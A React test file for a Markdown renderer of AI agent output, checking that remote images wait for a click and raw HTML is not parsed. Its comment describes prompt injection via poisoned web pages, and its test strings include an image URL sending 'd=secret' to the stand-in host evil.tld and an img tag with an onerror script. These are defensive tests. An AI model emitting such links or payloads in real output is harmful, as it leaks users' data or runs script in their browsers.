import { describe, it, expect } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { Markdown } from "./markdown";

/**
 * Agent markdown is untrusted input: an agent that ingests a poisoned web page
 * can be made to emit whatever the injector wants. These guard the two ways
 * that turns into a real attack in a browser.
 */
describe("Markdown", () => {
  it("does not fetch a remote image until the reader asks for it", () => {
    const { container } = render(<Markdown>{"![](https://evil.tld/x.png?d=secret)"}</Markdown>);
    // Nothing with a remote src in the DOM = no GET, so nothing is exfiltrated.
    expect(container.querySelector("img")).toBeNull();

    fireEvent.click(screen.getByRole("button"));
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "https://evil.tld/x.png?d=secret",
    );
  });

  it("names the host it would load from", () => {
    render(<Markdown>{"![a chart](https://evil.tld/x.png)"}</Markdown>);
    expect(screen.getByRole("button")).toHaveTextContent("evil.tld");
  });

  it("renders a same-origin file straight away", () => {
    const { container } = render(<Markdown>{"![f](/api/v1/files/abc/raw)"}</Markdown>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/api/v1/files/abc/raw");
    expect(screen.queryByRole("button")).toBeNull();
  });

  it("does not parse raw HTML (no rehype-raw)", () => {
    const { container } = render(
      <Markdown>{'<img src="https://evil.tld/y.png" onerror="alert(1)">'}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });
});
